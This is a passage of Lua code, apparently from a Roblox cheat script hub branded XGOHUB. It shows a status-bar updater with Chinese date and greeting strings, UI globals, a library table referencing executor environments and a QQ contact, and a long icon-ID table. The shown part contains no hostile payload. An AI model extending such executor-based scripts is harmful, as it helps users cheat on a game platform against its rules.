if bk then
	task.cancel(bk)
end
bk = spawn(function()
	while task.wait(0.5) do
		pcall(function()
			local bX = tick() - bW
			local bY = math.floor(bX / 3600)
			local bZ = math.floor(bX % 3600 / 60)
			local b_ = math.floor(bX % 60)
			local c0 = string.format("%02d:%02d:%02d", bY, bZ, b_)
			local c1 = os.date("%Y")
			local bQ = os.date("%m")
			local bR = os.date("%d")
			local c2 = os.date("%w")
			local c3
			if c2 == "\48" then
				c3 = "\230\151\165\227\128\145"
			elseif c2 == "\49" then
				c3 = "\228\184\128\227\128\145"
			elseif c2 == "\50" then
				c3 = "\228\186\140\227\128\145"
			elseif c2 == "\51" then
				c3 = "\228\184\137\227\128\145"
			elseif c2 == "\52" then
				c3 = "\229\155\155\227\128\145"
			elseif c2 == "\53" then
				c3 = "\228\186\148\227\128\145"
			else
				c3 = "\229\133\173"
			end
			local c4 = c1
				.. "\229\185\180"
				.. bQ
				.. "\230\156\136"
				.. bR
				.. "\230\151\165\32\227\128\144\229\145\168"
				.. c3
			local c5 = os.date("%H:%M:%S")
			local c6 = bP(tonumber(bQ), tonumber(bR))
			local c7 = bS(tonumber(bQ), tonumber(bR))
			local c8 = tonumber(os.date("%H"))
			local c9
			if c8 >= 0 and c8 < 5 then
				c9 =
					"\229\183\178\231\187\143\60\229\135\140\230\153\168\62\228\186\134\44\232\191\152\228\184\141\231\157\161"
			elseif c8 >= 5 and c8 < 12 then
				c9 = "\229\147\142\229\145\128\229\183\178\231\187\143\60\230\151\169\228\184\138\62\228\186\134"
			elseif c8 == 12 then
				c9 =
					"\60\228\184\173\229\141\136\62\229\144\131\233\165\173\231\154\132\230\151\182\233\151\180\229\136\176\229\150\189"
			elseif c8 > 12 and c8 < 18 then
				c9 =
					"\60\228\184\139\229\141\136\62\230\151\182\233\151\180\230\178\161\228\186\139\229\129\154\203\130\226\129\189\203\136\226\130\141\32\226\129\190\203\178\226\130\142\226\130\140"
			else
				c9 =
					"\229\183\178\231\187\143\60\230\153\154\228\184\138\62\228\186\134\229\145\128\44\230\151\169\231\130\185\231\157\161"
			end
			local ca = "未知"
			local cb = game:GetService("Stats")
			if cb and cb.Network and cb.Network.ServerStatsItem["Data Ping"] then
				ca = cb.Network.ServerStatsItem["Data Ping"]:GetValueString()
			end
			m.Text = "\232\132\154\230\156\172\230\151\182\233\149\191\58\32"
				.. c0
				.. "\32\124\32\232\174\190\229\164\135\58\32"
				.. bE()
				.. "\32\124\32\229\184\167\231\142\135\58\32"
				.. bG
				.. "\32\32\124\32\80\73\78\71\58\32"
				.. ca
				.. "\n"
				.. c4
				.. " "
				.. c5
				.. " "
				.. c6
				.. " "
				.. c7
				.. "\230\173\163\229\156\168\231\142\169\58\32"
				.. bA
				.. " | "
				.. c9
		end)
	end
end)
_G.XGO_RAW_UI = l
_G.XGO_RAW_UI.Enabled = true
_G.XGO_TextConn = bk
_G.XGO_SET_VISIBLE = function(cc)
	if _G.XGO_RAW_UI then
		_G.XGO_RAW_UI.Enabled = cc
	end
end
local Library = {
	Version = "\88\71\79\72\85\66\32\45\32\98\121\46\120\103\111",
	Loaded = true,
	QQ = "259461151",
	env = getgenv or getfenv,
	Executor = { "s", "w", "z", "t", "a", "c" },
	Skid = true,
	pcall = pcall,
	setfenv = setfenv,
	info = debug.info,
	xpcall = xpcall,
}
local function playSound(audioId)
	local sound = Instance.new("Sound")
	sound.SoundId = "rbxassetid://" .. audioId
	sound.Volume = 3
	sound.Pitch = 1
	sound.Parent = game.Workspace
	sound:Play()
end
Library.Icons = {
	["手"] = "rbxassetid://7733955740",
	["家"] = "rbxassetid://7733960981",
	["锚"] = "rbxassetid://7733911490",
	["票"] = "rbxassetid://7734086558",
	["列"] = "rbxassetid://7733757178",
	["秤"] = "rbxassetid://7734052454",
	["伞"] = "rbxassetid://7743874820",
	["云"] = "rbxassetid://7733746980",
	["风"] = "rbxassetid://7743878264",
	["雾"] = "rbxassetid://7733955969",
	["CD"] = "rbxassetid://7734110220",
	["CPU"] = "rbxassetid://7733765045",
	["锤子"] = "rbxassetid://7733955511",
	["历史"] = "rbxassetid://7733960880",
	["叉号"] = "rbxassetid://7743878857",
	["用户"] = "rbxassetid://7743875962",
	["幼苗"] = "rbxassetid://7743872071",
	["移动"] = "rbxassetid://7743870731",
	["槌子"] = "rbxassetid://7733800044",
	["鸡腿"] = "rbxassetid://8997385789",
	["快进"] = "rbxassetid://7733799371",
	["水滴"] = "rbxassetid://7733770982",
	["钥匙"] = "rbxassetid://7733965118",
	["电力"] = "rbxassetid://7733771628",
	["加号"] = "rbxassetid://7734042071",
	["吸管"] = "rbxassetid://7743871384",
	["扫描"] = "rbxassetid://8997386861",
	["RSS"] = "rbxassetid://7734052075",
	["活动"] = "rbxassetid://7733655755",
	["网格"] = "rbxassetid://7733955179",
	["菜单"] = "rbxassetid://7733993211",
	["地标"] = "rbxassetid://7733965184",
	["钱包"] = "rbxassetid://7743877573",
	["布局"] = "rbxassetid://7733970543",
	["欧元"] = "rbxassetid://7733771891",
	["图片"] = "rbxassetid://7733964126",
	["缩进"] = "rbxassetid://7733964452",
	["井号"] = "rbxassetid://7733955906",
	["光圈"] = "rbxassetid://7733666258",
	["表格"] = "rbxassetid://7743871876",
	["电视"] = "rbxassetid://7743874674",
	["耳机"] = "rbxassetid://7733956063",
	["回复"] = "rbxassetid://7734051594",
	["来电"] = "rbxassetid://7743871120",
	["倒带"] = "rbxassetid://7734051670",
	["引用"] = "rbxassetid://7734045100",
	["保存"] = "rbxassetid://7734052335",
	["等于"] = "rbxassetid://7733771811",
	["相机"] = "rbxassetid://7733708692",
	["卡车"] = "rbxassetid://7743874482",
	["解锁"] = "rbxassetid://7743875263",
	["网络"] = "rbxassetid://7734021047",
	["用户"] = "rbxassetid://7743876054",
	["书籍"] = "rbxassetid://7733914390",
	["放大"] = "rbxassetid://7743878977",
	["目标"] = "rbxassetid://7743872758",
	["快退"] = "rbxassetid://7734058404",
	["投射"] = "rbxassetid://7733919326",
	["电话"] = "rbxassetid://7734032056",
	["类型"] = "rbxassetid://7743874740",
	["虫子"] = "rbxassetid://7733701545",
	["鸡蛋"] = "rbxassetid://8997385940",
	["皇冠"] = "rbxassetid://7733765398",
	["金币"] = "rbxassetid://7743866529",
	["电池"] = "rbxassetid://7733674820",
	["雪山"] = "rbxassetid://7743870286",
	["礼物"] = "rbxassetid://7733946818",
	["选项"] = "rbxassetid://7734021300",
	["图钉"] = "rbxassetid://8997386648",
	["铅笔"] = "rbxassetid://7734022107",
	["云雾"] = "rbxassetid://7733920317",
	["检查"] = "rbxassetid://7733964808",
	["框架"] = "rbxassetid://7733799486",
	["货币"] = "rbxassetid://7733765592",
	["星星"] = "rbxassetid://7734068321",
	["微笑"] = "rbxassetid://7734059095",
	["下标"] = "rbxassetid://8997387937",
	["太阳"] = "rbxassetid://7734068495",
	["表格"] = "rbxassetid://7734073253",
	["标签"] = "rbxassetid://7734075797",
	["叉号"] = "rbxassetid://7733765224",
	["宝石"] = "rbxassetid://7733942651",
	["终端"] = "rbxassetid://7743872929",
	["灯泡"] = "rbxassetid://7733975185",
	["缩小"] = "rbxassetid://7734056971",
	["邮件"] = "rbxassetid://7733992732",
	["暂停"] = "rbxassetid://7734021897",
	["加粗"] = "rbxassetid://7733687211",
	["日历"] = "rbxassetid://7733919198",
	["蓝牙"] = "rbxassetid://7733687147",
	["指针"] = "rbxassetid://7734042307",
	["扳手"] = "rbxassetid://7743878358",
	["多云"] = "rbxassetid://7733747106",
	["电影"] = "rbxassetid://7733942579",
	["图层"] = "rbxassetid://7743868936",
	["语言"] = "rbxassetid://7733965249",
	["星号"] = "rbxassetid://7733673800",
	["上标"] = "rbxassetid://8997388036",
	["命令"] = "rbxassetid://7733924046",
	["平板"] = "rbxassetid://7743872620",
	["口袋"] = "rbxassetid://7734042139",
	["手表"] = "rbxassetid://7743877668",
	["定位"] = "rbxassetid://7733992469",
	["英镑"] = "rbxassetid://7734042354",
	["帐篷"] = "rbxassetid://7734078943",
	["日出"] = "rbxassetid://7743872365",
	["日落"] = "rbxassetid://7734070982",
	["版权"] = "rbxassetid://7733764196",
	["归档"] = "rbxassetid://7733911621",
	["斜体"] = "rbxassetid://7733964917",
	["建筑"] = "rbxassetid://7733701625",
	["烧杯"] = "rbxassetid://7733674922",
	["月亮"] = "rbxassetid://7743870134",
	["眼镜"] = "rbxassetid://7733954403",
	["羽毛"] = "rbxassetid://7733777166",
	["快进"] = "rbxassetid://7734058495",
	["下载"] = "rbxassetid://7733770755",
	["眼睛"] = "rbxassetid://7733774602",
	["包裹"] = "rbxassetid://7734021469",
	["皱眉"] = "rbxassetid://7733799591",
	["发送"] = "rbxassetid://7734053039",
	["闹钟"] = "rbxassetid://7733656100",
	["滑块"] = "rbxassetid://7734058803",
	["音乐"] = "rbxassetid://7734020554",
	["钞票"] = "rbxassetid://7733674153",
	["硬盘"] = "rbxassetid://7733955793",
	["搜索"] = "rbxassetid://7734052925",
	["斜杠"] = "rbxassetid://8997387644",
	["除法"] = "rbxassetid://7733769365",
	["视图"] = "rbxassetid://7743876754",
	["无奈"] = "rbxassetid://7733993147",
	["版权"] = "rbxassetid://7733764275",
	["减号"] = "rbxassetid://7734000129",
	["山脉"] = "rbxassetid://7734008868",
	["咖啡"] = "rbxassetid://7733752630",
	["画笔"] = "rbxassetid://7733701455",
	["登录"] = "rbxassetid://7733992604",
	["上传"] = "rbxassetid://7743875428",
	["勾选"] = "rbxassetid://7733715400",
	["剪刀"] = "rbxassetid://7734052570",
	["信息"] = "rbxassetid://7733964719",
	["展开"] = "rbxassetid://7733771982",
	["相册"] = "rbxassetid://7733658133",
	["书签"] = "rbxassetid://7733692043",
	["删除"] = "rbxassetid://7733768142",
	["铲子"] = "rbxassetid://7734056878",
	["播客"] = "rbxassetid://7734042234",
	["注销"] = "rbxassetid://7733992677",
	["点赞"] = "rbxassetid://7743873212",
	["复制"] = "rbxassetid://7733764083",
	["斧头"] = "rbxassetid://7733674079",
	["摇椅"] = "rbxassetid://7734051769",
	["圆形"] = "rbxassetid://7733919881",
	["鬼魂"] = "rbxassetid://7743868000",
	["奖章"] = "rbxassetid://7733673987",
	["盾牌"] = "rbxassetid://7734056608",
	["导入"] = "rbxassetid://7733964240",
	["尺子"] = "rbxassetid://7734052157",
	["骷髅"] = "rbxassetid://7734058599",
	["套索"] = "rbxassetid://7733967892",
	["播放"] = "rbxassetid://7743871480",
	["飞机"] = "rbxassetid://7734037723",
	["盒子"] = "rbxassetid://7733917120",
	["电源"] = "rbxassetid://7734042493",
	["地图"] = "rbxassetid://7733992829",
	["信号"] = "rbxassetid://8997387546",
	["重做"] = "rbxassetid://7743871739",
	["快进"] = "rbxassetid://7743867090",
	["抓取"] = "rbxassetid://7733954884",
	["饼干"] = "rbxassetid://8997385628",
	["饼图"] = "rbxassetid://7734034378",
	["充电"] = "rbxassetid://8997383136",
	["视频"] = "rbxassetid://7743876610",
	["铃铛"] = "rbxassetid://7733911828",
	["火焰"] = "rbxassetid://7733798747",
	["关机"] = "rbxassetid://7734042423",
	["撤销"] = "rbxassetid://7743874974",
	["裁剪"] = "rbxassetid://7733765140",
	["震动"] = "rbxassetid://7743876302",
	["心形"] = "rbxassetid://7733956134",
	["锁定"] = "rbxassetid://7733992528",
	["旗帜"] = "rbxassetid://7733798691",
	["雪花"] = "rbxassetid://7734059180",
	["汽车"] = "rbxassetid://7733708835",
	["衬衫"] = "rbxassetid://7734056672",
	["重复1"] = "rbxassetid://7734051342",
	["重复2"] = "rbxassetid://7734051454",
	["链接1"] = "rbxassetid://7733978098",
	["链接2"] = "rbxassetid://7743869163",
	["地球1"] = "rbxassetid://7733954760",
	["地球2"] = "rbxassetid://7733954611",
	["代码1"] = "rbxassetid://7733749837",
	["代码2"] = "rbxassetid://7733920644",
	["列表1"] = "rbxassetid://7743869612",
	["列表2"] = "rbxassetid://7743869517",
	["电视2"] = "rbxassetid://7743874599",
	["导航1"] = "rbxassetid://7734020989",
	["导航2"] = "rbxassetid://7734020942",
	["分享1"] = "rbxassetid://7734053697",
	["分享2"] = "rbxassetid://7734053595",
	["设置1"] = "rbxassetid://7734053495",
	["设置2"] = "rbxassetid://8997386997",
	["文件1"] = "rbxassetid://7743867554",
	["文件2"] = "rbxassetid://7733793319",
	["文件3"] = "rbxassetid://7743867811",
	["音量1"] = "rbxassetid://7743877081",
	["音量2"] = "rbxassetid://7743877250",
	["音量3"] = "rbxassetid://7743877487",
	["编辑1"] = "rbxassetid://7733771472",
	["编辑2"] = "rbxassetid://7733771217",
	["编辑3"] = "rbxassetid://7733771361",
	["时钟1"] = "rbxassetid://8997383694",
	["时钟2"] = "rbxassetid://8997384295",
	["时钟3"] = "rbxassetid://8997384456",
	["时钟4"] = "rbxassetid://8997384603",
	["时钟5"] = "rbxassetid://8997384798",
	["时钟6"] = "rbxassetid://8997384977",
	["时钟7"] = "rbxassetid://8997385147",
	["时钟8"] = "rbxassetid://8997385352",
	["时钟9"] = "rbxassetid://8997385485",
	["时钟10"] = "rbxassetid://8997383876",
	["时钟11"] = "rbxassetid://8997384034",
	["时钟12"] = "rbxassetid://8997384150",
	["时钟13"] = "rbxassetid://7733734848",
	["云-雨"] = "rbxassetid://7733746651",
	["云-雪"] = "rbxassetid://7733746798",
	["Wi-Fi"] = "rbxassetid://7743878148",
	["左对齐"] = "rbxassetid://7733911357",
	["右对齐"] = "rbxassetid://7733663582",
	["文件夹"] = "rbxassetid://7733799185",
	["无穷大"] = "rbxassetid://7733964640",
	["右上角"] = "rbxassetid://7733764915",
	["上右角"] = "rbxassetid://7733764680",
	["左上角"] = "rbxassetid://7733764536",
	["右下角1"] = "rbxassetid://7733764605",
	["左下角"] = "rbxassetid://7733764448",
	["首选项"] = "rbxassetid://8997383275",
	["安全帽"] = "rbxassetid://7733955850",
	["荧光笔"] = "rbxassetid://7743868648",
	["自行车"] = "rbxassetid://7733678330",
	["服务器"] = "rbxassetid://7734053426",
	["阴影框"] = "rbxassetid://297694300",
	["笔工具"] = "rbxassetid://7734022041",
	["显示器"] = "rbxassetid://7734002839",
	["删除线"] = "rbxassetid://7734068425",
	["麦克风"] = "rbxassetid://7743869805",
	["瞄准器"] = "rbxassetid://7733765307",
	["扩音器"] = "rbxassetid://7733993049",
	["龙卷风"] = "rbxassetid://7743873633",
	["二维码"] = "rbxassetid://7743871575",
	["图书馆"] = "rbxassetid://7743869054",
	["充电中"] = "rbxassetid://7734021231",
	["左下角1"] = "rbxassetid://7733764327",
	["信号低"] = "rbxassetid://8997387189",
	["三角形"] = "rbxassetid://7743874367",
	["侧边栏"] = "rbxassetid://7734058260",
	["西格玛"] = "rbxassetid://7734058345",
	["云关闭"] = "rbxassetid://7733745572",
	["收件箱"] = "rbxassetid://7733964370",
	["礼品卡"] = "rbxassetid://7733945018",
	["摄像头"] = "rbxassetid://7743877896",
	["手电筒"] = "rbxassetid://7733798851",
	["数据库"] = "rbxassetid://7743866778",
	["魔法棒"] = "rbxassetid://8997388430",
	["温度计"] = "rbxassetid://7734084149",
	["机器人"] = "rbxassetid://7733916988",
	["不等于"] = "rbxassetid://7733771726",
	["毕业帽"] = "rbxassetid://7733955058",
	["三叶草"] = "rbxassetid://7733747233",
	["仪表盘"] = "rbxassetid://7733799969",
	["书打开"] = "rbxassetid://7733687281",
	["回形针"] = "rbxassetid://7734021680",
	["收音机"] = "rbxassetid://7743871662",
	["调色板"] = "rbxassetid://7734021595",
	["八边形"] = "rbxassetid://7734021165",
	["购物袋"] = "rbxassetid://7734056747",
	["对比度"] = "rbxassetid://7733764005",
	["胡萝卜"] = "rbxassetid://8997382987",
	["二进制"] = "rbxassetid://7733678388",
	["公文包"] = "rbxassetid://7733919017",
	["过滤器"] = "rbxassetid://7733798407",
	["计算器"] = "rbxassetid://7733919105",
	["救生圈"] = "rbxassetid://7733973479",
	["存钱罐"] = "rbxassetid://7734034513",
	["百分比"] = "rbxassetid://7743870852",
	["联系人"] = "rbxassetid://7743866666",
	["下箭头"] = "rbxassetid://7733717447",
	["六边形"] = "rbxassetid://7743868527",
	["正方形"] = "rbxassetid://7743872181",
	["已验证"] = "rbxassetid://7743876142",
	["公交车"] = "rbxassetid://7733701715",
	["购物车"] = "rbxassetid://7734056813",
	["代码笔"] = "rbxassetid://7733920768",
	["下划线"] = "rbxassetid://7743874904",
	["扫描线"] = "rbxassetid://8997386772",
	["下载云"] = "rbxassetid://7733770689",
	["计时器"] = "rbxassetid://7743873443",
	["打印机"] = "rbxassetid://7734042580",
	["指南针"] = "rbxassetid://7733924216",
	["扬声器"] = "rbxassetid://7734063416",
	["剪贴板"] = "rbxassetid://7733734762",
	["条形图1"] = "rbxassetid://7733674319",
	["条形图2"] = "rbxassetid://7733674239",
	["加载器1"] = "rbxassetid://7733992358",
	["加载器2"] = "rbxassetid://7733989869",
	["最小化1"] = "rbxassetid://7733997941",
	["最小化2"] = "rbxassetid://7733997870",
	["最大化1"] = "rbxassetid://7733992901",
	["最大化2"] = "rbxassetid://7733992982",
	["垃圾桶1"] = "rbxassetid://7743873871",
	["垃圾桶2"] = "rbxassetid://7743873772",
	["GITLAD"] = "rbxassetid://7733954246",
	["Airplay"] = "rbxassetid://7733655834",
	["treLLO"] = "rbxassetid://7743873996",
	["github"] = "rbxassetid://7733954058",
	["FIGMA"] = "rbxassetid://7743867310",
	["dribbble"] = "rbxassetid://7733770843",
	["金属-手"] = "rbxassetid://7733955664",
	["信号-零"] = "rbxassetid://8997387434",
	["水滴-多"] = "rbxassetid://7733771078",
	["切换-右"] = "rbxassetid://7743873539",
	["星形-半"] = "rbxassetid://7734068258",
	["信号-高"] = "rbxassetid://8997387110",
	["上传-云"] = "rbxassetid://7743875358",
	["云-闪电"] = "rbxassetid://7733741741",
	["云-细雨"] = "rbxassetid://7733920226",
	["云-冰雹"] = "rbxassetid://7733920444",
	["云-月亮"] = "rbxassetid://7733920519",
	["云-太阳"] = "rbxassetid://7733746880",
	["切换-左"] = "rbxassetid://7734091286",
	["电池-满"] = "rbxassetid://7733674503",
	["wifi-关闭"] = "rbxassetid://7743878056",
	["GIT-合并"] = "rbxassetid://7733952195",
	["GIT-分支"] = "rbxassetid://7733949149",
	["GIT-提交"] = "rbxassetid://7743868360",
	["云-雨-风"] = "rbxassetid://7733746456",
	["语音信箱"] = "rbxassetid://7743876916",
	["水平移动"] = "rbxassetid://7734016210",
	["瑞士法郎"] = "rbxassetid://7734071038",
	["垂直移动"] = "rbxassetid://7743870608",
	["居中对齐"] = "rbxassetid://7733909776",
	["泽西岛镑"] = "rbxassetid://7733965029",
	["换行文本"] = "rbxassetid://8997388548",
	["列表检查"] = "rbxassetid://7743869317",
	["文件文本"] = "rbxassetid://7733789088",
	["文本光标"] = "rbxassetid://8997388195",
	["文件搜索"] = "rbxassetid://7733788966",
	["蓝牙关闭"] = "rbxassetid://7733914252",
	["用户检查"] = "rbxassetid://7743875503",
	["对角移动"] = "rbxassetid://7743870505",
	["闹钟减号"] = "rbxassetid://7733656164",
	["减号圆形"] = "rbxassetid://7733998053",
	["随机播放"] = "rbxassetid://7734057059",
	["除号圆形"] = "rbxassetid://7733769152",
	["垂直拉伸"] = "rbxassetid://8997387862",
	["美元符号"] = "rbxassetid://7733770599",
	["切换相机"] = "rbxassetid://7743872492",
	["相机关闭"] = "rbxassetid://7733919260",
	["大右箭头"] = "rbxassetid://7733671493",
	["大左箭头"] = "rbxassetid://7733911731",
	["大下箭头"] = "rbxassetid://7733668653",
	["向上箭头"] = "rbxassetid://7733673717",
	["大上箭头"] = "rbxassetid://7733671663",
	["向下箭头"] = "rbxassetid://7733672933",
	["双头箭头"] = "rbxassetid://7733720483",
	["左右箭头"] = "rbxassetid://8997382869",
	["左向箭头"] = "rbxassetid://7733673136",
	["右向箭头"] = "rbxassetid://7733673345",
	["两端对齐"] = "rbxassetid://7733661326",
	["外部链接"] = "rbxassetid://7743866903",
	["禁止进入"] = "rbxassetid://7734021118",
	["水平拉伸"] = "rbxassetid://8997387754",
	["包裹搜索"] = "rbxassetid://8997386448",
	["水平握把"] = "rbxassetid://7733955302",
	["减少缩进"] = "rbxassetid://7734021384",
	["有序列表"] = "rbxassetid://7743869411",
	["更多垂直"] = "rbxassetid://7734006187",
	["包裹加号"] = "rbxassetid://8997386355",
	["智能手机"] = "rbxassetid://7734058979",
	["站立的人"] = "rbxassetid://7743871002",
	["印度卢比"] = "rbxassetid://7733964536",
	["电话关闭"] = "rbxassetid://7734029534",
	["艾特符号"] = "rbxassetid://7733673907",
	["铃铛关闭"] = "rbxassetid://7733675107",
	["蓝牙搜索"] = "rbxassetid://7733914320",
	["视频关闭"] = "rbxassetid://7743876466",
	["关闭盾牌"] = "rbxassetid://7734056470",
	["电力关闭"] = "rbxassetid://7733771563",
	["定位固定"] = "rbxassetid://7733992424",
	["回复全部"] = "rbxassetid://7734051524",
	["垂直握把"] = "rbxassetid://7733955410",
	["盾牌检查"] = "rbxassetid://7734056411",
	["鼠标指针"] = "rbxassetid://7734010405",
	["文件输出"] = "rbxassetid://7733788742",
	["电话转接"] = "rbxassetid://7734027345",
	["屏幕共享"] = "rbxassetid://7734052814",
	["叉号圆形"] = "rbxassetid://7743878496",
	["铃铛加号"] = "rbxassetid://7733675181",
	["电池中等"] = "rbxassetid://7733674731",
	["帮助圆形"] = "rbxassetid://7733956210",
	["取消链接1"] = "rbxassetid://7743875149",
	["取消链接2"] = "rbxassetid://7743875069",
	["游戏手柄1"] = "rbxassetid://7733799901",
	["游戏手柄2"] = "rbxassetid://7733799795",
	["文件检查1"] = "rbxassetid://7733779668",
	["文件检查2"] = "rbxassetid://7733779610",
	["左上角-上"] = "rbxassetid://7733764800",
	["右下角-下"] = "rbxassetid://7733764385",
	["用户-加号"] = "rbxassetid://7743875759",
	["趋势-下降"] = "rbxassetid://7743874143",
	["电话-拨出"] = "rbxassetid://7743871253",
	["盾牌-警告"] = "rbxassetid://7734056326",
	["闹钟-勾选"] = "rbxassetid://7733655912",
	["闹钟-关闭"] = "rbxassetid://7733656003",
	["点赞-向下"] = "rbxassetid://7734084236",
	["趋势-上升"] = "rbxassetid://7743874262",
	["文件-叉号"] = "rbxassetid://7733938136",
	["暂停-圆形"] = "rbxassetid://7734021767",
	["列表-加号"] = "rbxassetid://7733984995",
	["书签-加号"] = "rbxassetid://7734111084",
	["盒子-选择"] = "rbxassetid://7733696665",
	["消息-圆形"] = "rbxassetid://7733993311",
	["电池-充电"] = "rbxassetid://7733674402",
	["文件-代码"] = "rbxassetid://7733779730",
	["包裹-叉号"] = "rbxassetid://8997386545",
	["圆形-斜杠"] = "rbxassetid://8997383530",
	["停止-圆形"] = "rbxassetid://7734068379",
	["铃铛-减号"] = "rbxassetid://7733675028",
	["铃铛-响铃"] = "rbxassetid://7733675275",
	["加号-圆形"] = "rbxassetid://7734040271",
	["电话-未接"] = "rbxassetid://7734029465",
	["鼠标-指针"] = "rbxassetid://7743870392",
	["排序-降序"] = "rbxassetid://7743871973",
	["眼睛-关闭"] = "rbxassetid://7733774495",
	["音量-关闭"] = "rbxassetid://7743877381",
	["用户-减号"] = "rbxassetid://7743875629",
	["烧瓶-圆形"] = "rbxassetid://7733798957",
	["闹钟-加号"] = "rbxassetid://7733658066",
	["布局-网格"] = "rbxassetid://7733970390",
	["包裹-检查"] = "rbxassetid://8997386143",
	["缩小-放大"] = "rbxassetid://7743879082",
	["包裹-减号"] = "rbxassetid://8997386266",
	["套索-选择"] = "rbxassetid://7743868832",
	["电话-呼叫"] = "rbxassetid://7734027264",
	["地图-图钉"] = "rbxassetid://7733992789",
	["列表-减号"] = "rbxassetid://7733980795",
	["向上-箭头"] = "rbxassetid://7733919605",
	["布局-模板"] = "rbxassetid://7733970494",
	["盾牌-关闭"] = "rbxassetid://7734056540",
	["信号-中等"] = "rbxassetid://8997387319",
	["图片-关闭"] = "rbxassetid://7733963907",
	["向左-箭头"] = "rbxassetid://7733717651",
	["烧瓶-锥形"] = "rbxassetid://7733798901",
	["书签-减号"] = "rbxassetid://7733689754",
	["用户-叉号"] = "rbxassetid://7743875879",
	["警告-圆形"] = "rbxassetid://7733658271",
	["表单-输入"] = "rbxassetid://7733799275",
	["播放-圆形"] = "rbxassetid://7734037784",
	["文件-输入"] = "rbxassetid://7733935917",
	["文件-数字"] = "rbxassetid://7733935829",
	["布局-列表"] = "rbxassetid://7733970442",
	["图片-减号"] = "rbxassetid://7733963797",
	["排序-升序"] = "rbxassetid://7734060715",
	["图片-加号"] = "rbxassetid://7733964016",
	["更多-水平"] = "rbxassetid://7734006080",
	["勾选-圆形1"] = "rbxassetid://7733919427",
	["勾选-圆形2"] = "rbxassetid://7733710700",
	["文件-加号1"] = "rbxassetid://7733788885",
	["文件-加号2"] = "rbxassetid://7733788816",
	["文件-减号1"] = "rbxassetid://7733936115",
	["文件-减号2"] = "rbxassetid://7733936010",
	["顺时针旋转"] = "rbxassetid://7734051957",
	["逆时针旋转"] = "rbxassetid://7734051861",
	["刷新顺时针"] = "rbxassetid://7734051052",
	["文件夹减号"] = "rbxassetid://7733799022",
	["剪贴板检查"] = "rbxassetid://7733919947",
	["谷歌浏览器"] = "rbxassetid://7733919783",
	["俄罗斯卢布"] = "rbxassetid://7734052248",
	["上下双箭头"] = "rbxassetid://7733723321",
	["右向圆箭头"] = "rbxassetid://7733673229",
	["向上双箭头"] = "rbxassetid://7733723433",
	["向下右箭头"] = "rbxassetid://7733672831",
	["向上左箭头"] = "rbxassetid://7733673539",
	["左向圆箭头"] = "rbxassetid://7733673056",
	["水平分隔线"] = "rbxassetid://7734053146",
	["服务器崩溃"] = "rbxassetid://7734053281",
	["计时器关闭"] = "rbxassetid://8997388325",
	["加号正方形"] = "rbxassetid://7734040369",
	["计时器重置"] = "rbxassetid://7743873336",
	["剪贴板列表"] = "rbxassetid://7733920117",
	["显示器关闭"] = "rbxassetid://7734000184",
	["熄灭的灯泡"] = "rbxassetid://7733975123",
	["手电筒关闭"] = "rbxassetid://7733798799",
	["函数正方形"] = "rbxassetid://7733799682",
	["警告三角形"] = "rbxassetid://7733658504",
	["正则表达式"] = "rbxassetid://7734051188",
	["垂直分隔线"] = "rbxassetid://7734053213",
	["服务器-关闭"] = "rbxassetid://7734053361",
	["剪贴板-叉号"] = "rbxassetid://7733734668",
	["温度计-雪花"] = "rbxassetid://7743873074",
	["最后-双箭头"] = "rbxassetid://8997383390",
	["链接-2-关闭"] = "rbxassetid://7733975283",
	["剪贴板-复制"] = "rbxassetid://7733920037",
	["勾选-正方形"] = "rbxassetid://7733919526",
	["向上-右箭头"] = "rbxassetid://7733673646",
	["叉号-正方形"] = "rbxassetid://7743878737",
	["减号-正方形"] = "rbxassetid://7743869899",
	["终端-正方形"] = "rbxassetid://7734079055",
	["消息-正方形"] = "rbxassetid://7733993369",
	["叉号-八边形"] = "rbxassetid://7743878618",
	["电池-低电量"] = "rbxassetid://7733674589",
	["刷新-逆时针"] = "rbxassetid://7734050715",
	["布局-仪表盘"] = "rbxassetid://7733970318",
	["文件夹-打开"] = "rbxassetid://8997386062",
	["麦克风-关闭"] = "rbxassetid://7743869714",
	["侧边栏-关闭"] = "rbxassetid://7734058092",
	["警告-八边形"] = "rbxassetid://7733658335",
	["向下-左箭头"] = "rbxassetid://7733672282",
	["侧边栏-打开"] = "rbxassetid://7734058165",
	["暂停-八边形"] = "rbxassetid://7734021827",
	["向下-双箭头"] = "rbxassetid://7733720604",
	["向左-双箭头"] = "rbxassetid://7733720701",
	["XGO1"] = "rbxassetid://123698784885744",
	["XGO2"] = "rbxassetid://88666635012556",
	["XGO3"] = "rbxassetid://102797584513959",
	["XGO4"] = "rbxassetid://96996396016819",
	["XGO5"] = "rbxassetid://128885038925647",
	["XGO6"] = "rbxassetid://120611289434746",
	["XGO7"] = "rbxassetid://86451637909512",
	["XGO8"] = "rbxassetid://109948306798374",
	["XGO9"] = "rbxassetid://92630758837243",
	["XGOA"] = "rbxassetid://123841629074044",
	["XGOB"] = "rbxassetid://116659429137594",
	["XGOC"] = "rbxassetid://114637828840342",
	["XGOD"] = "rbxassetid://105061267460765",
	["XGOE"] = "rbxassetid://94515694400442",
	["XGOF"] = "rbxassetid://77486522529796",
	["向下箭头-圆形"] = "rbxassetid://7733671763",
	["收音机-接收器"] = "rbxassetid://7734045155",
	["垂直结束对齐"] = "rbxassetid://8997380907",
	["向上箭头-圆形"] = "rbxassetid://7733673466",
	["git-分支-加号"] = "rbxassetid://7743868200",
	["屏幕共享-关闭"] = "rbxassetid://7734052653",
	["git-拉取请求"] = "rbxassetid://7733952287",
	["对角线移动-2"] = "rbxassetid://7734013178",
	["水平结束对齐"] = "rbxassetid://8997380820",
	["蓝牙-已连接"] = "rbxassetid://7734110952",
	["除号-正方形"] = "rbxassetid://7733769261",
	["温度计-太阳"] = "rbxassetid://7734084018",
	["文件夹-加号"] = "rbxassetid://7733799092",
	["笔记本电脑1"] = "rbxassetid://7733965386",
	["笔记本电脑2"] = "rbxassetid://7733965313",
	["向右-双箭头1"] = "rbxassetid://7733717755",
	["向右-双箭头2"] = "rbxassetid://7733919682",
	["水平分布-结束"] = "rbxassetid://8997381144",
	["垂直分布-结束"] = "rbxassetid://8997382326",
	["垂直居中对齐"] = "rbxassetid://8997380737",
	["垂直开始对齐"] = "rbxassetid://8997382085",
	["垂直居中分布"] = "rbxassetid://8997382212",
	["水平开始对齐"] = "rbxassetid://8997381965",
	["水平分布开始"] = "rbxassetid://8997381290",
	["智能手机充电"] = "rbxassetid://7734058894",
	["水平居中对齐"] = "rbxassetid://8997380477",
	["旗帜-三角形-右"] = "rbxassetid://7733798634",
	["鼠标-指针-点击"] = "rbxassetid://7734010488",
